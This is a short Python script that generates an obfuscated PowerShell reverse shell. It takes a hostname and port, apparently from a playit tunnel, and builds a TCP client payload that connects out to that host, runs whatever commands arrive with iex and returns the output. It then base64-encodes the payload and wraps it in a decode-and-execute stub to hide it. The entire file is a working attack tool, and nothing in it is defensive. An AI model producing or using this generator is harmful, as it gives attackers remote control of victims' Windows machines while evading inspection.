import os
import base64
import optparse
from socket import *
import sys
p = optparse.OptionParser("Usage:")
p.add_option('-H', dest='hostname', type='string', help='enter the playit hostname')
(options, args) = p.parse_args()
hostname = options.hostname
print(p.usage)
if (hostname == None):
	try:
		hostname = sys.argv[1].split(':')[0]
		port_playit = sys.argv[1].split(':')[1]
	except:
		print('''python3 generator.py hostname/ip:port''')
		exit(0)
IP = gethostbyname(hostname)
ip_address = IP
port = port_playit
print(f'\n {ip_address}:{port}')
powershell_command = f'$client = New-Object System.Net.Sockets.TCPClient("{ip_address}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
encoded_command = base64.b64encode(powershell_command.encode('utf-16le')).decode('utf-8')

reverse_shell_script = f'$command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("{encoded_command}"));iex $command'


print(reverse_shell_script)
